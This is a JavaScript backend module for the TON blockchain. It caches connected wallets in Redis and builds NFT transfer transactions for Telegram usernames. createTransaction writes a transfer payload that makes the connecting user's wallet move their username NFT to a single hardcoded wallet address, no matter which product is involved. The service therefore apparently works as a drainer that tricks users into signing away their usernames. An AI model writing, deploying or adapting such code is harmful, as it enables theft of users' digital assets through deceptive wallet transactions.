import redis from "../utils/redis.js";
import TonWeb from "tonweb";
import crypto from "crypto";

const tonweb = new TonWeb(
  new TonWeb.HttpProvider("https://toncenter.com/api/v2/jsonRPC")
);

// 工具：TON→nanoTON（字符串）
const toNanoStr = (vTon) => TonWeb.utils.toNano(String(vTon)).toString();

// 构造 NFT 标准 transfer payload（真正的所有权转移需要用这个）
async function buildNftTransferPayloadBase64({
  newOwner,
  responseTo,
  forwardAmountTon = 0.01,
  forwardComment = "",
}) {
  if (typeof newOwner !== "string") {
    throw new Error(`newOwner 不是字符串: ${newOwner}`);
  }
  if (typeof responseTo !== "string") {
    throw new Error(`responseTo 不是字符串: ${responseTo}`);
  }

  const cell = new TonWeb.boc.Cell();
  cell.bits.writeUint(0x5fcc3d14, 32); // NFT transfer op
  cell.bits.writeUint(0, 64); // query_id
  cell.bits.writeAddress(new TonWeb.utils.Address(newOwner));
  cell.bits.writeAddress(new TonWeb.utils.Address(responseTo));
  cell.bits.writeBit(0); // no custom_payload
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon)));

  const forwardPayload = new TonWeb.boc.Cell();
  if (forwardComment) {
    forwardPayload.bits.writeUint(0, 32);
    forwardPayload.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
  }
  cell.refs.push(forwardPayload);

  // 修正：await cell.toBoc()
  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

export class WalletService {
  /**
   * 连接钱包
   */
  static async connectWallet(wallet, raw) {
    try {
      // 将钱包信息存储到Redis，设置过期时间（24小时）
      const walletKey = `wallet:${wallet}`;
      await redis.setex(
        walletKey,
        86400,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );

      console.log("钱包连接成功，已缓存到Redis:", wallet);

      return {
        success: true,
        message: "",
        data: {
          status: "connected",
        },
      };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  /**
   * 生成用户名转移交易（标准方式）
   */
  static async createTransaction(wallet, productInfo) {
    try {
      console.log("createTransaction", wallet, productInfo);
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        throw new Error("walletData not found");
      }
      const username = productInfo[2];
      const newOwnerWallet = "UQBpLklcE-q4blWYIm_oKCZodHH4Aj-n9KDv6WEMOktSh7dW";

      const gasFeeNano = toNanoStr(0.01); // 0.01 TON = 10,000,000 nanoTON
      const res = await fetch(`https://tonapi.io/v2/dns/${username}.t.me`);
      const data = await res.json();
      console.log("data", data);
      const nftItemAddress = data?.item?.address ?? null;
      
      console.log(
        "createTransaction",
        username,
        gasFeeNano,
        newOwnerWallet,
        nftItemAddress
      );

      const payloadBase64 = await buildNftTransferPayloadBase64({
        newOwner: newOwnerWallet, // 新所有者的钱包（写入 payload）
        responseTo: wallet, // 可用你的商户/回执地址
        forwardAmountTon: 0.01, // 转给新所有者的随附金额（可为 0）
        forwardComment: `transfer @${username}`,
      });

      const messages = [
        {
          address: nftItemAddress, // ★ 目标是 NFT item 合约地址，不是新所有者钱包
          amount: gasFeeNano, // 手续费等
          payload: payloadBase64, // 正确的 BOC（base64）
        },
      ];

      const raw = {
        type: "nft_username_transfer",
        username,
        wallet,
        nftItemAddress,
        newOwnerWallet,
        amount: gasFeeNano,
        ts: Date.now(),
      };
      // 生成HMAC
      const sig = this.signRaw(raw);

      // 生成并记录 txKey（可用于幂等/回查）
      const txKey = `tx:${wallet}:${raw.ts}`;
      await redis.setex(txKey, 600, JSON.stringify({ messages, raw, sig }));

      console.log("交易数据已生成:", txKey);

      return {
        success: true,
        data: { messages, raw, sig },
        raw,
        messages: sig,
        txKey, // 单独返回，不要覆盖 messages
      };
    } catch (error) {
      console.error("生成用户名转移交易错误:", error);
      throw new Error(`生成用户名转移交易失败: ${error.message}`);
    }
  }

  /**
   * HMAC签名
   */
  static signRaw(rawObj) {
    const json = JSON.stringify(rawObj);
    const appSecret = process.env.APP_SECRET;
    return crypto.createHmac("sha256", appSecret).update(json).digest("hex");
  }
}
